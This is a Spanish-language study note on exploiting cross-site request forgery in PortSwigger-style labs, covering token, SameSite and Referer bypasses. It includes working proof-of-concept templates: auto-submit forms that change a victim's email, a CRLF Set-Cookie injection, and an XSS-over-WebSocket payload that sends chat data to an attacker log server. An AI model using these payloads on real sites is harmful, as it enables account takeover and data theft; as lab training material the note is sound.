---
aliases:
  - CSRF
  - Cross-Site Request Forgery
  - cross-site-request-forgery
  - csrf-entrypoint
tags:
  - vuln/csrf
  - entrypoint
---

# CSRF (Cross-Site Request Forgery) — Punto de entrada

> Documento **agnóstico al negocio**: responde *cómo **explotar** un CSRF*.
> **Dónde** aplica en el target (qué acción cambiar) → eso vive en los `STAGE_x` (recon del negocio).

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 11 labs (Apprentice + Practitioner), orden oficial + foco de cada uno: [labs/README.md](labs/README.md)
- 🧰 **Burp** → *Engagement tools → Generate CSRF PoC* (Professional) genera el HTML auto-submit.
- 🔗 Cuando **hay token** y no lo bypasseás por CSRF → [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|XSS que lee el token]] o **dangling markup** bajo CSP.

## 🎯 Condiciones para que exista CSRF (la FLAG real)

CSRF requiere **las tres** a la vez:

1. **Acción relevante con estado** que valga la pena forjar → cambiar **email/password**, borrar cuenta, transferir, hacer admin… **Esta es la FLAG por defecto: que exista una acción relevante.** Sin acción que forjar, no hay CSRF útil.
2. **Manejo de sesión basado en cookies** — la request se autoriza **solo** con la cookie de sesión, que el navegador manda **sola** en peticiones cross-site.
3. **Parámetros predecibles** — no hay ningún valor que el atacante no pueda conocer/adivinar (si hay un token CSRF fuerte y bien atado, esto falla… salvo los bypasses de abajo).

> [!danger] 🚩 ¿Está o no está?
> La pregunta correcta **no** es "¿tiene token?" sino **"¿hay una acción relevante que forjar?"**. Si la hay → evaluá la defensa (token / SameSite / Referer) y buscá el punto flojo. La ausencia de token es el caso fácil; con token, casi siempre hay un bypass.

## 🧪 Cómo explotar (metodología)

1. **Identificá la acción relevante** (change-email/password, etc.) y capturá la request en Burp.
2. **Mirá la defensa:**
   - ¿Hay **token CSRF**? ¿en qué parámetro? ¿cambia por request? ¿está atado a *tu* sesión?
   - ¿La cookie tiene **`SameSite`**? (`Strict`/`Lax`/`None` o ausente).
   - ¿Valida **`Referer`/`Origin`**?
3. **Probá los puntos flojos** (tabla abajo) hasta que la request pase sin la interacción legítima.
4. **Armá el PoC** (form auto-submit / GET / `_method` / CRLF Set-Cookie) y **entregalo a la víctima** por el exploit server.
5. **Verificá impacto:** que la acción se ejecutó en la sesión de la víctima (email cambiado → reset de password).

## 🚚 Tipos de ataque (vectores de entrega)

> En todos, la <mark>URL dinámica</mark> resaltada es lo que reemplazás por el **target** de cada lab (o por tu **Collaborator** cuando el objetivo es *exfiltrar*, no ejecutar). Qué vector podés usar depende del **SameSite** de la cookie (ver más abajo).

**1) POST form (auto-submit)** — el clásico. Manda la cookie si `SameSite=None`. Sirve cuando la acción es un POST con body `x-www-form-urlencoded`:
<pre><code>&lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
  &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>

**2) IMG con GET** — una línea, sin JS. Sirve si el endpoint acepta **GET** (o con `_method`). También es el vector para **beacon de exfiltración** apuntando al Collaborator:
<pre><code>&lt;img src="https://<mark>TARGET</mark>/my-account/change-email?email=<mark>attacker@evil.com</mark>"&gt;
&lt;!-- exfil: &lt;img src="https://<mark>BURP-COLLABORATOR</mark>/?token="+... --&gt;</code></pre>

**3) fetch con `credentials: "include"`** — manda la cookie en un fetch cross-site. Control fino del método/body; ideal para **APIs REST** (ver flag abajo). No necesitás leer la respuesta (CORS la tapa), solo causar el efecto:
<pre><code>&lt;script&gt;
fetch("https://<mark>TARGET</mark>/my-account/change-email", {
  method: "POST",
  credentials: "include",                                  // ← manda la cookie
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=<mark>attacker@evil.com</mark>"
});
&lt;/script&gt;</code></pre>

> [!danger] 🚩 API REST que espera JSON → **NO es descarte**
> Que el endpoint sea una **API REST con `Content-Type: application/json`** **no** mata el CSRF. La clave es el **preflight CORS**:
> - Un fetch cross-site con `application/json` es un content-type **"no simple"** → dispara **preflight `OPTIONS`** → si el server no lo permite, se bloquea.
> - Pero los content-types **"simples"** (`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`) **NO** disparan preflight → la request pasa.
> - **Probá convertir el body JSON a `x-www-form-urlencoded`** (o `text/plain` con el JSON crudo dentro). **Si el server igual parsea el body → el CSRF sigue vivo.** Un `<form>` HTML **solo** puede mandar esos tres content-types (nunca `application/json`), por eso la conversión es *la* técnica.

## 🔎 Puntos flojos a verificar (bypass de token)

> El token puede existir pero estar **mal implementado**. Probá en este orden:

<table>
<tr><th>Punto flojo</th><th>Cómo detectarlo</th><th>Bypass</th></tr>
<tr><td><b>Valida el token en POST pero NO en GET</b></td><td>Cambiá el método a GET (o buscá si el endpoint acepta GET)</td><td>Mandá la acción por <b>GET sin token</b> (o con <code>_method</code>). El validador solo corre en POST.</td></tr>
<tr><td><b>Valida el token solo si está presente</b></td><td>Sacá el parámetro <code>csrf</code> por completo (no lo dejes vacío: <b>eliminalo</b>)</td><td>Sin parámetro <code>csrf</code> → no hay nada que validar → pasa.</td></tr>
<tr><td><b>Token NO atado a la sesión</b></td><td>Logueate como atacante, copiá <b>tu</b> token válido, usalo en la request de la víctima</td><td>Reusás <b>tu propio token</b> (es válido "para cualquiera"). El server no chequea que sea de esa sesión.</td></tr>
<tr><td><b>Token atado a una cookie que NO es la de sesión</b> (dos frameworks: uno maneja sesión, otro CSRF)</td><td>El token se valida contra una cookie tipo <code>csrfKey</code> aparte de la de sesión</td><td>Buscá un endpoint que dispare <b>Set-Cookie</b> (p. ej. <code>search</code> con CRLF) para <b>setear tu <code>csrfKey</code></b> en la víctima + tu token que matchea. Ver PoC CRLF abajo.</td></tr>
<tr><td><b>Token duplicado en cookie y body (double-submit)</b></td><td>El server solo compara que <code>csrf</code> del <b>body</b> == <code>csrf</code> de la <b>cookie</b> (no valida el token de verdad)</td><td>Inyectá <code>Set-Cookie: csrf=<mark>fake</mark></code> (CRLF) y mandá <code>csrf=<mark>fake</mark></code> en el body → coinciden → pasa. Cualquier valor sirve mientras <b>header/cookie y body sean iguales</b>.</td></tr>
</table>

> [!tip] "Dos frameworks distintos"
> Cuando **la sesión** la maneja un componente y **el CSRF** otro, el token suele atarse a una **cookie propia** (`csrfKey`, `csrf`…) **no** ligada a tu login. Si podés **setear esa cookie** en el navegador de la víctima (vía CRLF/Set-Cookie o `Set-Cookie` reflejado), controlás el token y el bypass sale. Buscá **qué endpoint dispara `Set-Cookie`** y si podés inyectar contenido ahí.

## 🍪 Bypass de SameSite

La cookie moderna suele venir con `SameSite`. Cómo cae cada nivel:

<table>
<tr><th>SameSite</th><th>Qué bloquea</th><th>Bypass</th></tr>
<tr><td><code>None</code> / ausente</td><td>Nada (histórico)</td><td>CSRF clásico directo.</td></tr>
<tr><td><code>Lax</code> (default de Chrome)</td><td>POST cross-site; deja pasar <b>GET de navegación top-level</b></td><td><b>Method override:</b> GET con <code>_method=POST</code> (o <code>X-HTTP-Method-Override</code>). El framework lo trata como POST.</td></tr>
<tr><td><code>Strict</code></td><td>TODO lo cross-site</td><td>1) <b>Redirect del lado cliente</b>: un gadget same-site que redirige según un parámetro → la request final sale del propio sitio. 2) <b>Subdominio hermano</b>: XSS/WebSocket en <code>cms.</code>/hermano (mismo <i>site</i>) → las cookies Strict viajan entre hermanos.</td></tr>
</table>

> [!note] 🍪 SameSite **enruta el vector, NO descarta el CSRF**
> No hace falta `SameSite=None` sí o sí. Lo que cambia es **qué vector** de los de arriba te sirve:
> - **`None`/ausente** → andan **todos** (POST form, IMG, fetch).
> - **`Lax`** → los vectores subrecurso (POST form auto-submit, IMG, fetch) **no** llevan la cookie; **solo** una **navegación GET top-level** la lleva → usá `location=…&_method=POST`.
> - **`Strict`** → nada cross-site → necesitás **redirect client-side** o **subdominio hermano**.
> Es "descarte" **solo** para el PoC cross-site directo cuando es `Strict` y no hay gadget → ahí saltás a **XSS**. Pero como clase, CSRF casi nunca queda descartado por SameSite (labs 7-11).

## 🔗 Bypass de Referer

El server quiere que el `Referer` (de dónde venís) sea del propio sitio. Cuando la víctima dispara tu exploit, el Referer sale con **tu** dominio (`exploit-server.net`) → la defensa te bloquea. Cómo la rompés depende de **qué tan débil valida**. Son **dos escenarios distintos** (dos labs), con objetivos opuestos sobre el Referer:

> [!abstract] 🎨 Leyenda de colores (en los PoCs de abajo)
> - <mark>🖊️ amarillo</mark> = **lo que VOS reemplazás** sí o sí antes de entregar (cambia según el lab: dominio del target, tu email). Si no lo tocás, **al horno**.
> - <mark style="background:#90caf9;color:#111">🔑 azul</mark> = **la clave del bypass** (el mecanismo que hace que funcione). Es fijo, NO se cambia: es lo que tenés que entender/recordar.

<table>
<tr><th>#</th><th>Defensa</th><th>Objetivo con el Referer</th><th>Idea del bypass</th></tr>
<tr><td>A</td><td>Valida <b>solo si el Referer está presente</b> (si falta, deja pasar)</td><td><b>Que NO exista</b> (null / ausente)</td><td>Suprimir el Referer con <mark style="background:#90caf9;color:#111">no-referrer</mark>.</td></tr>
<tr><td>B</td><td>Valida que el Referer <b>contenga</b> el dominio (match por <i>substring</i>)</td><td><b>Que exista con TU dominio</b> + el target embebido</td><td>Meter el dominio víctima en tu query string y forzar el Referer completo con <mark style="background:#90caf9;color:#111">unsafe-url</mark> / <mark style="background:#90caf9;color:#111">pushState</mark>.</td></tr>
</table>

> [!tip] 🔍 Cómo saber cuál es
> Mandá la request legítima desde Burp y **borrale el header `Referer`**. Si **pasa** → es el caso **A** (validación solo-si-presente). Si **falla sin Referer pero pasa con uno válido** → es el caso **B** (tenés que falsificar el contenido).

### A) Referer ausente — *validan solo si está presente*

El server hace `if (referer) { chequeá que sea mío }`. Si no hay Referer, no hay nada que chequear → pasa. Suprimís el Referer para toda la página con la meta-tag `no-referrer`, y adentro va el **form auto-submit** de siempre.

<pre><code>&lt;!-- pseudo: [meta no-referrer] + [form change-email] + [JS que lo autoenvía] --&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;!-- 🔑 clave: hace que NINGUNA request de esta página lleve Referer --&gt;
    &lt;meta name="referrer" content="<mark style="background:#90caf9;color:#111">no-referrer</mark>"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
    &lt;/form&gt;
    &lt;script&gt;<mark style="background:#90caf9;color:#111">document.forms[0].submit();</mark>&lt;/script&gt;  &lt;!-- autoejecuta --&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>

### B) Referer falsificado — *validan que contenga el dominio (substring)*

El server hace `if (referer.includes("target.web-security-academy.net"))`. El match es por substring, no exacto → metés esa string **dentro de tu propia URL** (en la query). El Referer sale como `https://exploit-server.net/?target.web-security-academy.net` → contiene la string → pasa.

> [!warning] ⚠️ El navegador recorta el Referer por defecto
> Por privacidad, Chrome manda **solo el origin** (`https://exploit-server.net/`) y **borra la query string** → se pierde tu `?target...` y el bypass no anda. Tenés que forzar el Referer **completo**. Dos formas equivalentes:

**Opción 1 — `Referrer-Policy: unsafe-url` (apuesta segura para el examen).** Es un **header** que configurás en el propio exploit server (campo *Head*, no en el HTML). Le dice al navegador "mandá el Referer completo, sin recortar".

<pre><code>&lt;!-- En el exploit server, sección Head (headers de respuesta): --&gt;
<mark style="background:#90caf9;color:#111">Referrer-Policy: unsafe-url</mark>

&lt;!-- 🔑 clave: la URL del exploit lleva el target en la query → así aparece en el Referer --&gt;
&lt;!-- exploit-server.net/exploit?<mark>TARGET</mark>  →  Referer = esa URL completa --&gt;
&lt;html&gt;&lt;body&gt;
  &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
  &lt;/form&gt;
  &lt;script&gt;<mark style="background:#90caf9;color:#111">document.forms[0].submit();</mark>&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre>

**Opción 2 — `history.pushState` (alternativa JS).** En vez del header, **reescribís la URL de tu propia página** con JS *antes* de enviar el form, metiendo el dominio del target. Así el Referer que se manda ya lo lleva embebido. Útil si no querés/podés tocar los headers, o si querés controlar la string exacta desde el HTML.

<pre><code>&lt;html&gt;&lt;body&gt;
  &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
  &lt;/form&gt;
  &lt;script&gt;
    // 🔑 clave: reescribe la URL actual → el Referer llevará el dominio del target embebido
    // pushState(state, title, url)  →  url pasa a ser la "página actual"
    <mark style="background:#90caf9;color:#111">history.pushState("", "", "/?</mark><mark>TARGET</mark><mark style="background:#90caf9;color:#111">");</mark>
    <mark style="background:#90caf9;color:#111">document.forms[0].submit();</mark>  // recién ahora autoejecuta
  &lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre>

> [!note] 📌 `unsafe-url` vs `pushState`
> Con `Referrer-Policy: unsafe-url` el target va en la **query de la URL del exploit** (`?TARGET`) y el header hace que se mande entero. Con `history.pushState` el target lo inyectás **desde el JS** reescribiendo la URL. Para el examen priorizá **`unsafe-url`**: hoy `pushState` es menos fiable en Chrome. Tenelo como plan B.

## 🐍 PoCs (plantillas)

> En todos, lo <mark>resaltado</mark> es lo que reemplazás: la URL del target y tu email/valor. La URL del target conviene tenerla como **variable** (`url`) para reusar el snippet.

### 1) Form auto-submit (POST, sin defensa o con token bypasseado)

<pre><code>&lt;html&gt;&lt;body&gt;
  &lt;form action="https://<mark>TARGET</mark>/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="<mark>attacker@evil.com</mark>"&gt;
  &lt;/form&gt;
  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre>

### 2) GET con `_method=POST` (SameSite=Lax)

<pre><code>&lt;script&gt;
const url = "https://<mark>TARGET</mark>";
const email = Math.random().toString(36).slice(2) + "@example.com";
location = `${url}/my-account/change-email?email=${email}&_method=POST`;
&lt;/script&gt;</code></pre>

### 3) CRLF → Set-Cookie (token atado a cookie no-de-sesión / double-submit)

Setea la cookie de CSRF de la víctima con un valor tuyo, y después envía el form con el token que coincide:

<pre><code>&lt;script&gt;
const url  = "https://<mark>TARGET</mark>";
const csrf = "<mark>fake</mark>";           // el valor que vas a duplicar en cookie y body
const email = Math.random().toString(36).slice(2) + "@example.com";

// (a) endpoint que refleja en Set-Cookie vía CRLF → setea csrf/csrfKey en la víctima
new Image().src = `${url}/?search=x%0d%0aSet-Cookie:%20csrf=${csrf}%3b%20SameSite=None`;

// (b) form con el MISMO valor en el body → cookie == body → pasa
setTimeout(() =&gt; {
  const f = document.createElement("form");
  f.method = "POST";
  f.action = `${url}/my-account/change-email`;
  f.innerHTML = `&lt;input name=email value="${email}"&gt;&lt;input name=csrf value="${csrf}"&gt;`;
  document.body.appendChild(f);
  f.submit();
}, 1000);
&lt;/script&gt;</code></pre>

> `%0d` = CR · `%0a` = LF · `%0d%0a` = CRLF (lo que corta la cabecera para inyectar `Set-Cookie`).

### 4) Subdominio hermano (SameSite=Strict) — ejemplo real con WebSocket

Cuando la cookie es `Strict` pero hay **XSS en un subdominio hermano**, lanzás el ataque desde ahí (same-site). Ejemplo: inyectar por el login de un `cms.` un payload que abre el WebSocket de chat y exfiltra al exploit server:

<pre><code>&lt;script&gt;
const url = "https://<mark>cms-TARGET</mark>";          // subdominio hermano vulnerable a XSS
const attackerServer = "https://<mark>EXPLOIT</mark>/logs";

const script = `
&lt;audio src=x onerror="
  const ws = new WebSocket('wss://<mark>TARGET</mark>/chat');
  ws.onopen = () =&gt; ws.send('READY');
  ws.onmessage = (e) =&gt; fetch('${attackerServer}' + e.data);
"&gt;`;

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/login`;
form.innerHTML = `&lt;input name=username value='${script}'&gt;&lt;input name=password value='x'&gt;`;
document.body.appendChild(form);
form.submit();
&lt;/script&gt;</code></pre>

### 5) Burp CSRF PoC generator (Professional)

`Proxy`/`Repeater` → botón derecho sobre la request → **Engagement tools → Generate CSRF PoC** → copia el HTML al exploit server. Marcá *"Include auto-submit script"*.

---

> [!note] Relación con XSS
> Si hay **token bien implementado** (atado a sesión, no bypasseable) → el CSRF "puro" no alcanza. La salida es un **XSS** que **lea el token** de la página y forje la request en el mismo origen, o **dangling markup** para exfiltrar el token bajo CSP. Ambos en → [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|entry point de XSS]].
